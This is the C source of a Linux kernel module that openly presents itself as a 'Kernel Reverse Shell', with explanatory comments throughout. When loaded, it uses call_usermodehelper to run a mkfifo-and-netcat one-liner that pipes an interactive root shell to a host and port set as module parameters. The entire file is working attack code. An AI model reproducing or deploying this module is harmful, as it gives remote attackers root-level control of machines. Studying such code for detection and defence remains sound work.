#include <linux/init.h> /* Needed for the macros */
#include <linux/module.h> /* Needed by all modules */
#include <linux/kernel.h> /* Needed for KERN_INFO */
/* Include two new headers that will allow us to send data to and from the user
using file referance (fs) and user access (uaccess) to safely read from address
into variable*/
#include <linux/fs.h>
#include <linux/uaccess.h>
/* Include another two headers, These functions return information about a file,
in the buffer */
#include <linux/moduleparam.h>
#include <linux/stat.h>

/* Define the device name */
#define DEVICE_NAME "lkm_device"

/* Define paramaters to be set and used to initiate reverse shell */
static char *host = "ADDR=127.0.0.1";
module_param(host, charp, 0000);
static char *port = "PORT=1234";
module_param(port, charp, 0000);

static int __init lkm_device_init(void) {
  /* Create a character array to hold the environment variables for the reverse
  shell */
  char *environment[] = {
    "HOME=/root", "TERM=xterm", host,port, NULL
  };
  /* Create a seperate character array to hold the */
  char *arguments[] = {
    /* Call netcat reverse shell arguments from within kernel space, this will
    later be called */
    "/bin/bash","-c",
    "/usr/bin/rm \
     /tmp/polo;/usr/bin/mkfifo \
     /tmp/polo;/usr/bin/cat \
     /tmp/polo|/bin/sh -i 2>&1|/usr/bin/nc \
      $ADDR $PORT >/tmp/polo",
    NULL
  };

  printk(KERN_INFO "Kernel Reverse Shell Initialised\n");
  /* To invoke a reverse shell within kernel space we use the
  call_usermodehelper function. Our reverse shell is spawned as a child of a
  kernel thread called keventd */
	call_usermodehelper(arguments[0],arguments,environment,UMH_WAIT_EXEC);
	printk(KERN_INFO "Kernel Reverse Shell Execution Started\n");
	return 0;
}

static void __exit lkm_device_exit(void) {
  printk(KERN_INFO "Kernel Reverse Shell Execution Ended\n");
}

module_init(lkm_device_init);
module_exit(lkm_device_exit);
